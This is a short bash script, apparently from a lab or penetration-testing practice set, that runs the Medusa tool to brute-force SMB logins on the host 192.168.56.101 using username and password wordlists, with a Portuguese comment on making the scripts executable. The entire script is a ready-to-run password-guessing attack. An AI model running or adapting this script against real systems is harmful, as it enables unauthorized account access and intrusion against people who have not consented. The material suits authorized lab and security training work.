#!/bin/bash
TARGET=192.168.56.101
USERFILE=../wordlists/common-usernames.txt
PASSFILE=../wordlists/small-words.txt
medusa -h $TARGET -U $USERFILE -P $PASSFILE -M smb -t 8

#Dê permissão de execução: chmod +x scripts/*.sh